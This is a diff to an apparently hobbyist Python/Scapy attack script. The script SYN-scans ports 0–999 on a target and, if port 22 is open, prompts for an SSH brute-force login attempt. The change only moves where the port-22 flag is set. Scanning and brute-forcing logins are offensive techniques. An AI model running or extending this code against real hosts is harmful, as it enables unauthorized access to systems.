@@ -51,7 +51,6 @@ def BruteForce(atak_port):
                 print(f"login:{user} and password:{password} failed")
 
 def ScanPort(atak_port):
-    global Port22
     src_port = RandShort()
     conf.verb = 0
     response = sr1(IP(dst=target)/TCP(sport=src_port,dport=atak_port,flags="S"),timeout=0.5,verbose=0)
@@ -60,9 +59,7 @@ def ScanPort(atak_port):
             close_connection = sr(IP(dst=target)/TCP(sport=src_port,dport=atak_port,flags='R'),timeout=2, verbose=0)
             print(f" port {atak_port} is open.")
             Open_Ports.append(atak_port)
-            if atak_port==22:
-                Port22=True
-            
+
 
 def TargetCheck(target):
     try:
@@ -92,6 +89,11 @@ if TargetCheck(target):
     print("Now it scans open ports:")
     for destination_port in range(0, 1000):
         ScanPort(destination_port)
+
+    for Ports in Open_Ports:
+        #print(Ports)
+        if Ports==22:
+            Port22=True
 
     if Port22==True:
         attack=input("brute-force attack on that port 22 ? (y/n): ")
